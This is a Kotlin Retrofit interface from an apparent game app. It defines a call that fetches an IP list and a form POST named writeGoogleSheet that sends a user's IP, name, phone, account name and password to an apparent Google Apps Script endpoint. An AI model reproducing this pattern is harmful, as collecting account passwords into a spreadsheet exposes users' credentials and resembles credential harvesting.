package com.sangtb.game.data

import com.sangtb.game.data.response.IPList
import com.sangtb.game.data.response.ResultGoogleSheet
import retrofit2.Call
import retrofit2.http.*
import java.util.*

interface ApiIpList {

    @GET("api")
    suspend fun getAPIIp(): IPList

    @FormUrlEncoded
    @POST("exec")
    suspend fun writeGoogleSheet(
        @Field("ip") ip: String,
        @Field("name") name: String,
        @Field("phone") phone: String,
        @Field("accountKU") accountKU: String,
        @Field("password") password: String,
        @Field("action") action: String
    ) : ResultGoogleSheet
}